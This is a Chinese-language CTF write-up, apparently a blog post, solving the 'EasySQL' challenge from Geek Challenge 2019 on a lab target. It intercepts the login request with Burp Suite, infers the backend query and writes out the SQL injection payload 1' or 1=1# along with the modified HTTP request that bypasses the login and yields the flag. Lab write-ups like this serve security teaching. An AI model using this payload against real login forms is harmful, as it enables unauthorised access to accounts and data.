---
title: 极客大挑战 2019 EasySQL
date: 2023-10-24
categories:
  - CTF
  - Web
---

## 前置工作

启动靶机，看到如下网页：

![](https://p.sda1.dev/13/06389bed26e67392efcea676663e7467/image.png)

根据题目名字，可以确定这是一道 SQL 注入题，打开 F12 翻看源代码，发现登录框是一个表单，将用户名和密码以 `Request Params`（其实就是 `GET`） 的形式传入 `check.php`

![](https://p.sda1.dev/13/f14587237edfdbfe7dbf1f5971768b8b/image.png)

## 确定请求体

但无法确定具体的请求，于是我们使用 Burp Suite 进行一次抓包，打开 Burp Suite，进入代理，打开内嵌浏览器，开启拦截

![](https://p.sda1.dev/13/d277053d8385513f65a4346863978579/image.png)

中间过程直接放行，直到点击`登录`的时候，暂时先不放行，查看请求体

![](https://p.sda1.dev/13/c57108edc284109f362325509aa9ec39/image.png)

```http
GET /check.php?username=root&password=123456 HTTP/1.1
Host: 49057452-8bbe-4d5d-920b-be06e63840d6.node4.buuoj.cn:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://49057452-8bbe-4d5d-920b-be06e63840d6.node4.buuoj.cn:81/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

得出具体的请求方式是 `GET /check.php?username={username}&password={password}`

## 尝试注入

尝试性地往用户名输入框中输入 `root'`，密码随便输，提示如下

![](https://p.sda1.dev/13/4435ef1306e400b126532e0c56fd74c9/image.png)

提示发现这是 MariaDB 数据库，当 MySQL 做就行了，从这一段话中我们还能够猜测一下这条查询语句到底是什么，才导致会出这条错

```sql
SELECT * FROM XXX WHERE username='$user' AND password='$pass';
```

在这种情况下如果我的 `username` = `root'`，那么语句就会变成这样

```sql
SELECT * FROM XXX WHERE username='root'' AND password='$pass';
```

## 万能密码

可以看到这样就会产生格式错误，那么我们就得想办法绕过这个查询，就得用到万能密码，我们尝试将 SQL 语句更改成一种 100% 通过的样子：

```sql
SELECT * FROM XXX WHERE username='1' or 1=1#' AND password='1';
```

即 `username` = `1' or 1=1#`，`password` = `1`，其中 `username` 的值就是万能密码，将 Burp Suite 拦截到的请求进行修改，改成

```http
GET /check.php?username=1%27+or+1%3D1%23&password=1 HTTP/1.1
Host: 49057452-8bbe-4d5d-920b-be06e63840d6.node4.buuoj.cn:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://49057452-8bbe-4d5d-920b-be06e63840d6.node4.buuoj.cn:81/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

之后放行该请求，得到 Flag，`flag{6965df19-7ebe-42f7-b396-14d380a5d9e7}`

![](https://p.sda1.dev/13/0e789a154b3ae53ff5f35d58a4c9baf2/image.png)